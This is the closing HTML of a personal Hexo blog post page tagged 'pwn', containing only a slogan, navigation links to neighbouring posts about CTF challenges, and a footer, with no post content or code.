                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Do you believe in <strong>DESTINY</strong>?</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/pwn/"># pwn</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2023/08/23/Blockchain/">浅析Blockchain类题入门</a>
            
            
            <a class="next" rel="next" href="/2023/05/12/AntCTF-x-D%C2%B3CTF-d3op%E5%A4%8D%E7%9B%98%E7%AC%94%E8%AE%B0/">AntCTF x D³CTF 2023 d3op复盘笔记</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© viol1t | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>